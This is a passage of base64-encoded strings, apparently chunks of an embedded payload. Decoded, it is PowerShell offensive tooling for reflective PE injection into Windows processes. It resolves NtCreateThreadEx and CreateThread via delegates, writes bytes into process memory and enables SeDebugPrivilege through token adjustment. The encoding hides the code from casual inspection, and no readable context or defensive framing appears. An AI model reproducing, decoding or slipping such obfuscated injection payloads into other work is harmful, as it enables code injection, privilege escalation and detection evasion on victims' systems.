FeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgTnREbGwuZGxsIE50Q3JlYXRlVGhyZWFkRXgKICAgICAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0Jvb2xdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtVSW50MzJdKQogICAgICAgICAgICAkTnRDcmVhdGVUaHJlYWRFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCROdENyZWF0ZVRocmVhZEV4QWRkciwgJE50Q3JlYXRlVGhyZWFkRXhEZWxlZ2F0ZSkKCQkgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRDcmVhdGVUaHJlYWRFeCAtVmFsdWUgJE50Q3JlYXRlVGhyZWFkRXgKICAgICAgICB9CgkJCgkJJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBLZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MKICAgICAgICAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJc1dvdzY0UHJvY2VzcyAtVmFsdWUgJElzV293NjRQcm9jZXNzCgkJCgkJJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgS2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQoJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIENyZWF0ZVRocmVhZCAtVmFsdWUgJENyZWF0ZVRocmVhZAoJCQoJCXJldHVybiAkV2luMzJGdW5jdGlvbnMKCX0KCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgkJCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJIyMjIyMjIyMjIyMgICAgSEVMUEVSUyAgICMjIyMjIyMjIyMjIwoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCSNQb3dlcnNoZWxsIG9ubHkgZG9lcyBzaWduZWQgYXJpdGhtZXRpYywgc28gaWYgd2Ugd2FudCB0byBjYWxjdWxhdGUgbWVtb3J5IGFkZHJlc3NlcyB3ZSBoYXZlIHRvIHVzZSB0aGlzIGZ1bmN0aW9uCgkjVGhpcyB3aWxsIGFkZCBzaWduZWQgaW50ZWdlcnMgYXMgaWYgdGhleSB3ZXJlIHVuc2lnbmVkIGludGVnZXJzIHNvIHdlIGNhbiBhY2N1cmF0ZWx5IGNhbGN1bGF0ZSBtZW1vcnkgYWRkcmVzc2VzCglGdW5jdGlvbiBTdWItU2lnbmVkSW50QXNVbnNpZ25lZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTEsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50NjRdCgkJJFZhbHVlMgoJCSkKCQkKCQlbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQoJCVtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCgkJW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgoJCWlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKCQl7CgkJCSRDYXJyeU92ZXIgPSAwCgkJCWZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQoJCQl7CgkJCQkkVmFsID0gJFZhbHVlMUJ5dGVzWyRpXSAtICRDYXJyeU92ZXIKCQkJCSNTdWIgYnl0ZXMKCQkJCWlmICgkVmFsIC1sdCAkVmFsdWUyQnl0ZXNbJGldKQoJCQkJewoJCQkJCSRWYWwgKz0gMjU2CgkJCQkJJENhcnJ5T3ZlciA9IDEKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkQ2FycnlPdmVyID0gMAoJCQkJfQoJCQkJCgkJCQkKCQkJCVtVSW50MTZdJFN1bSA9ICRWYWwgLSAkVmFsdWUyQnl0ZXNbJGldCgoJCQkJJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkYKCQkJfQoJCX0KCQllbHNlCgkJewoJCQlUaHJvdyAiQ2Fubm90IHN1YnRyYWN0IGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgoJCX0KCQkKCQlyZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCgl9CgkKCglGdW5jdGlvbiBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBN",
		"YW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTEsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50NjRdCgkJJFZhbHVlMgoJCSkKCQkKCQlbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQoJCVtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCgkJW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgoJCWlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKCQl7CgkJCSRDYXJyeU92ZXIgPSAwCgkJCWZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQoJCQl7CgkJCQkjQWRkIGJ5dGVzCgkJCQlbVUludDE2XSRTdW0gPSAkVmFsdWUxQnl0ZXNbJGldICsgJFZhbHVlMkJ5dGVzWyRpXSArICRDYXJyeU92ZXIKCgkJCQkkRmluYWxCeXRlc1skaV0gPSAkU3VtIC1iYW5kIDB4MDBGRgoJCQkJCgkJCQlpZiAoKCRTdW0gLWJhbmQgMHhGRjAwKSAtZXEgMHgxMDApCgkJCQl7CgkJCQkJJENhcnJ5T3ZlciA9IDEKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkQ2FycnlPdmVyID0gMAoJCQkJfQoJCQl9CgkJfQoJCWVsc2UKCQl7CgkJCVRocm93ICJDYW5ub3QgYWRkIGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgoJCX0KCQkKCQlyZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCgl9CgkKCglGdW5jdGlvbiBDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnQ2NF0KCQkkVmFsdWUxLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTIKCQkpCgkJCgkJW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKCQlbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQoKCQlpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCgkJewoJCQlmb3IgKCRpID0gJFZhbHVlMUJ5dGVzLkNvdW50LTE7ICRpIC1nZSAwOyAkaS0tKQoJCQl7CgkJCQlpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtZ3QgJFZhbHVlMkJ5dGVzWyRpXSkKCQkJCXsKCQkJCQlyZXR1cm4gJHRydWUKCQkJCX0KCQkJCWVsc2VpZiAoJFZhbHVlMUJ5dGVzWyRpXSAtbHQgJFZhbHVlMkJ5dGVzWyRpXSkKCQkJCXsKCQkJCQlyZXR1cm4gJGZhbHNlCgkJCQl9CgkJCX0KCQl9CgkJZWxzZQoJCXsKCQkJVGhyb3cgIkNhbm5vdCBjb21wYXJlIGJ5dGUgYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplIgoJCX0KCQkKCQlyZXR1cm4gJGZhbHNlCgl9CgkKCglGdW5jdGlvbiBDb252ZXJ0LVVJbnRUb0ludAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1VJbnQ2NF0KCQkkVmFsdWUKCQkpCgkJCgkJW0J5dGVbXV0kVmFsdWVCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUpCgkJcmV0dXJuIChbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkVmFsdWVCeXRlcywgMCkpCgl9CgoKICAgIEZ1bmN0aW9uIEdldC1IZXgKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgICRWYWx1ZSAjV2Ugd2lsbCBkZXRlcm1pbmUgdGhlIHR5cGUgZHluYW1pY2FsbHkKICAgICAgICApCgogICAgICAgICRWYWx1ZVNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFZhbHVlLkdldFR5cGUoKSkgKiAyCiAgICAgICAgJEhleCA9ICIweHswOlgkKCRWYWx1ZVNpemUpfSIgLWYgW0ludDY0XSRWYWx1ZSAjUGFzc2luZyBhIEludFB0ciB0byB0aGlzIGRvZXNuJ3Qgd29yayB3ZWxsLiBDYXN0IHRvIEludDY0IGZpcnN0LgoKICAgICAgICByZXR1cm4gJEhleAogICAgfQoJCgkKCUZ1bmN0aW9uIFRlc3QtTWVtb3J5UmFuZ2VWYWxpZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N0cmluZ10KCQkkRGVidWdTdHJpbmcsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkUEVJbmZvLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkU3RhcnRBZGRyZXNzLAoJCQoJCVtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJTaXplIiwgUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkU2l6ZQoJCSkKCQkKCSAgICBbSW50UHRyXSRGaW5hbEVuZEFkZHJlc3MgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFN0YXJ0QWRkcmVzcykgKCRTaXplKSkKCQkKCQkkUEVFbmRBZGRyZXNzID0gJFBFSW5mby5FbmRBZGRyZXNzCgkJCgkJaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRQRUluZm8uUEVIYW5kbGUpICgkU3RhcnRBZGRyZXNzKSkgLWVxICR0cnVlKQoJCXsKCQkJVGhyb3cgIlRyeWluZyB0byB3cml0ZSB0byBtZW1vcnkgc21hbGxlciB0aGFuIGFsbG9jYXRlZCBhZGRyZXNzIHJhbmdlLiAkRGVidWdTdHJpbmciCgkJfQoJCWlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkRmluYWxFbmRBZGRyZXNzKSAoJFBFRW5kQWRkcmVzcykpIC1lcSAkdHJ1ZSkKCQl7CgkJCVRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IGdyZWF0ZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIgoJCX0KCX0KCQoJCglGdW5jdGlvbiBXcml0ZS1CeXRlc1RvTWVtb3J5Cgl7CgkJUGFyYW0oCgkJCVtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCQlbQnl0ZVtdXQoJCQkkQnl0ZXMsCgkJCQoJCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQkJW0ludFB0cl0KCQkJJE1lbW9yeUFkZHJlc3MKCQkpCgkKCQlmb3IgKCRPZmZzZXQgPSAwOyAkT2Zmc2V0IC1sdCAkQnl0ZXMuTGVuZ3RoOyAkT2Zmc2V0KyspCgkJewoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpXcml0ZUJ5dGUoJE1lbW9yeUFkZHJlc3MsICRPZmZzZXQsICRCeXRlc1skT2Zmc2V0XSkKCQl9Cgl9CgkKCgkjRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCglGdW5jdGlvbiBHZXQtRGVsZWdhdGVUeXBlCgl7CgkgICAgUGFyYW0KCSAgICAoCgkgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCgkgICAgICAgIAoJICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQoJICAgICAgICBbVHlwZVtdXQoJICAgICAgICAkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCgkgICAgICAgIAoJICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KCSAgICAgICAgW1R5cGVdCgkgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCgkgICAgKQoKCSAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KCSAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQoJICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKCSAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCgkgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQoJICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKCSAgICAkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQoJICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJICAgIAoJICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgl9CgoKCSNGdW5jdGlvbiB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uLCBCbG9nOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8KCUZ1bmN0aW9uIEdldC1Qcm9jQWRkcmVzcwoJewoJICAgIFBhcmFtCgkgICAgKAoJICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCgkgICAgCgkgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KCSAgICAgICAgW1N0cmluZ10KCSAgICAgICAgJE1vZHVsZSwKCSAgICAgICAgCgkgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KCSAgICAgICAgW1N0cmluZ10KCSAgICAgICAgJFByb2NlZHVyZQoJICAgICkKCgkgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCgkgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKCSAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CgkgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKCSAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQoJICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQoJICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCgkgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQoJICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgoJICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKCgkgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCgkgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCgl9CgkKCQoJRnVuY3Rpb24gRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9u",
		"cywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyQ29uc3RhbnRzCgkJKQoJCQoJCVtJbnRQdHJdJFRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRDdXJyZW50VGhyZWFkLkludm9rZSgpCgkJaWYgKCRUaHJlYWRIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJVGhyb3cgIlVuYWJsZSB0byBnZXQgdGhlIGhhbmRsZSB0byB0aGUgY3VycmVudCB0aHJlYWQiCgkJfQoJCQoJCVtJbnRQdHJdJFRocmVhZFRva2VuID0gW0ludFB0cl06Olplcm8KCQlbQm9vbF0kUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQoJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJewoJCQkkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoJCQlpZiAoJEVycm9yQ29kZSAtZXEgJFdpbjMyQ29uc3RhbnRzLkVSUk9SX05PX1RPS0VOKQoJCQl7CgkJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkltcGVyc29uYXRlU2VsZi5JbnZva2UoMykKCQkJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJCQl7CgkJCQkJVGhyb3cgIlVuYWJsZSB0byBpbXBlcnNvbmF0ZSBzZWxmIgoJCQkJfQoJCQkJCgkJCQkkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQoJCQkJaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKCQkJCXsKCQkJCQlUaHJvdyAiVW5hYmxlIHRvIE9wZW5UaHJlYWRUb2tlbi4iCgkJCQl9CgkJCX0KCQkJZWxzZQoJCQl7CgkJCQlUaHJvdyAiVW5hYmxlIHRvIE9wZW5UaHJlYWRUb2tlbi4gRXJyb3IgY29kZTogJEVycm9yQ29kZSIKCQkJfQoJCX0KCQkKCQlbSW50UHRyXSRQTHVpZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuTFVJRCkpCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5Mb29rdXBQcml2aWxlZ2VWYWx1ZS5JbnZva2UoJG51bGwsICJTZURlYnVnUHJpdmlsZWdlIiwgJFBMdWlkKQoJCWlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJewoJCQlUaHJvdyAiVW5hYmxlIHRvIGNhbGwgTG9va3VwUHJpdmlsZWdlVmFsdWUiCgkJfQoKCQlbVUludDMyXSRUb2tlblByaXZTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLlRPS0VOX1BSSVZJTEVHRVMpCgkJW0ludFB0cl0kVG9rZW5Qcml2aWxlZ2VzTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblByaXZTaXplKQoJCSRUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5Qcml2aWxlZ2VzTWVtLCBbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKQoJCSRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlQ291bnQgPSAxCgkJJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VzLkx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUEx1aWQsIFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpCgkJJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VzLkF0dHJpYnV0ZXMgPSAkV2luMzJDb25zdGFudHMuU0VfUFJJVklMRUdFX0VOQUJMRUQKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkVG9rZW5Qcml2aWxlZ2VzLCAkVG9rZW5Qcml2aWxlZ2VzTWVtLCAkdHJ1ZSkKCgkJJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5BZGp1c3RUb2tlblByaXZpbGVnZXMuSW52b2tlKCRUaHJlYWRUb2tlbiwgJGZhbHNlLCAkVG9rZW5Qcml2aWxlZ2VzTWVtLCAkVG9rZW5Qcml2U2l6ZSwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKQoJCSRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpICNOZWVkIHRoaXMgdG8gZ2V0IHN1Y2Nlc3MgdmFsdWUgb3IgZmFpbHVyZSB2YWx1ZQoJCWlmICgoJFJlc3VsdCAtZXEgJGZhbHNlKSAtb3IgKCRFcnJvckNvZGUgLW5lIDApKQoJCXsKCQkJI1Rocm93ICJVbmFibGUgdG8gY2FsbCBBZGp1c3RUb2tlblByaXZpbGVnZXMuIFJldHVybiB2YWx1ZTogJFJlc3VsdCwgRX